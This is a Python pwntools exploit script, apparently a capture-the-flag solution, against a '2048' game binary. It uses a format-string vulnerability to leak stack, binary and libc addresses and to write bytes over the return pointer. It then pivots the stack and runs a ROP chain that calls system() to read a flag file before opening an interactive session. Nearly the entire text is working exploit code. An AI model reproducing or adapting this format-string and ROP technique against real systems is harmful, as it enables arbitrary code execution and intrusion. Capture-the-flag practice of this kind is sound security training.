#!/usr/bin/python

from pwn import *
import time

p = process('telnet.sh')
usleepToSystemOffset = -0xa3d80 #find this by leaking libc

#p = process('2k48')
#usleepToSystemOffset = -0xa54a0

def vuln(formatStr,firstTime = False):
    if not firstTime:
        p.send('Y\n')
    time.sleep(1)
    p.send('Q')
    p.send('L')
    p.send('Q')
    p.send('Q')
    p.send('Q')
    p.recvuntil('name')
    p.send(formatStr+'\n\n')
    result = p.recvuntil('Y/N')
    return result

def wbw(what,where,munge=False): #write byte primitive
    print "write: *(char*)%x = %x" % (where,what)
    if munge:
        fmtstr = "%%1$%du%%8$hhnAAA" % (what)
    else:
        fmtstr = "%%1$%du%%8$hhnAAAA" % (what)
    fmtstr += p32(where)
    vuln(fmtstr)

def www(what,where,munge = False):
    for b in what:
        if ord(b) > 0x80 or ord(b) == 0:
            munge = True
        else:
            munge = False
        wbw(ord(b),where,munge)
        where += 1


#gdb.attach(p)
time.sleep(1)
leaks = vuln('%d 0x%x 0x%x').split()
stack = (int(leaks[8],0)) #pointer on stack
binary = (int(leaks[9],0) & 0xfffff000) - 0x2000 # start of binary
print "Stack pointer: %x" % stack
print "Binary pointer; %x" % binary

leaks = vuln(' %x %x %x %x%x%x%x%x%x%x %s '+p32(binary+0x4f8c)).split()
usleep = struct.unpack("<I",leaks[11][:4])[0]
print "Found usleep: 0x%x" % usleep
system = usleep + usleepToSystemOffset
print "system: 0x%x" % system

retptr = stack+4
www('\xc2',retptr, True) #need to realign the stack to avoid \x0d and \x0a in addr
retptr += 4
newstackloc = stack-0xb38+0x20-0x50
www(p32(binary+0x19bb)+p32(newstackloc),retptr) #pivot stack //pop ecx ; pop ebx ; pop esi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret

#no \n's in ropchain:
roplen = 0x30
flagloc = p32(newstackloc + roplen - 0x10)
ebx = p32(binary+0x4f48)
popebxret = p32(binary+0x951)
fopen = p32(binary+0xa98)
flag = 'cat /opt/2048/flag\0A' #16 bytes
ropchain = 'Z'*(28)
ropchain += p32(system)
ropchain += "AAAA" #fopen return
ropchain += flagloc
ropchain += "BBBBCCCCDDDD"
ropchain += 'X'*(roplen-len(ropchain))
ropchain += 'Z'*12
ropchain += flag

if '\n' in ropchain:
    print "ERROR. Newline in ropchain. Bail."
    exit()
vuln(ropchain) #pivot stack here.
p.send('N\n')
p.interactive()
